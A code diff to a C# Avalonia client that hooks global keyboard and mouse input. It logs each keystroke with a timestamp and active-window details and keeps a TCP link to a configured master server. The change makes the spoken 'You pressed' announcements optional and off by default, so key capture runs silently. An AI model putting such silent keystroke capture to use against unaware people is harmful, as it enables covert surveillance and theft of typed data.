@@ -9,6 +9,7 @@ using CLIENT.Helpers;
 using System.Speech.Synthesis;
 using System.Threading;
 using System.IO;
+using Avalonia.Controls.Documents;
 
 namespace CLIENT.ViewModels
 {
@@ -19,6 +20,8 @@ namespace CLIENT.ViewModels
         private TcpClient _client;
         private NetworkStream _stream;
         private SpeechSynthesizer _synth;
+        private bool _speak;
+
         public MainWindowViewModel()
         {
             DotNetEnv.Env.Load();
@@ -32,6 +35,8 @@ namespace CLIENT.ViewModels
             string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
             int port = int.TryParse(serverPortStr, out int p) ? p : 2025;
             string serverIp = Environment.GetEnvironmentVariable("MASTER_IP") ?? "127.0.0.1";
+            _speak = bool.TryParse(Environment.GetEnvironmentVariable("SPEAK"), out bool speakValue) ? speakValue : false;
+
 
             _synth.SetOutputToDefaultAudioDevice();
             
@@ -40,16 +45,20 @@ namespace CLIENT.ViewModels
             {
                 string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                 string windowInfo = WindowDetector.GetActiveWindowInfo();
-                _synth.SpeakAsyncCancelAll();
-                _synth.SpeakAsync($"You pressed {key}");
+                if(_speak) { 
+                    _synth.SpeakAsyncCancelAll();
+                    _synth.SpeakAsync($"You pressed {key}");
+                }
                 AppendMessageToLogAsync($"[{timestamp}] : Key: {key}, {windowInfo}");
             };
             KeyboardDetector.Start();
 
             MouseDetector.OnMouseHoverRead += (content) =>
             {
-                _synth.SpeakAsyncCancelAll();
-                _synth.SpeakAsync($"Content at mouse position: {content}");
+                if (_speak) { 
+                    _synth.SpeakAsyncCancelAll();
+                    _synth.SpeakAsync($"Content at mouse position: {content}");
+                }
             };
             MouseDetector.Start();
 
@@ -196,8 +205,12 @@ namespace CLIENT.ViewModels
         }
         public async Task SendAppInfoAsync(string appName)
         {
-            _synth.SpeakAsyncCancelAll();
-            _synth.SpeakAsync($"You clicked {appName}");
+            if (_speak)
+            {
+                _synth.SpeakAsyncCancelAll();
+                _synth.SpeakAsync($"You clicked {appName}");
+            }
+           
             string message = $"Clicked: {appName}";
             string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
             AppendMessageToLogAsync($"[{timestamp}] : {message}");
